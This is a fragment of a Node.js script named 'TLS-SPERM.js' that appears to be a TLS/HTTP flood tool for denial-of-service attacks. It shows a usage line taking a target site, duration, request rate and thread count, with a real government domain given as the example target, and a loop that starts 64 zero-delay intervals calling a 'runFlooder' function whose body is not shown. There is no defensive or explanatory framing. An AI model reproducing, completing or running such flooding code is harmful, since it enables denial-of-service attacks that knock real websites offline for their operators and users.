...
const coloredAsciiArt = gradient.atlas.multiline(bokept);
console.log(coloredAsciiArt);

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;

 if (process.argv.length < 5){console.log(`Usage: node TLS-SPERM.js SITE TIME RPS THREADS\nExample: node TLS-SPERM.js https://bssn.go.id 125 5 2`); process.exit();}
...
} else {for (let i = 0; i < 64; i++) { setInterval(runFlooder, 0) }}
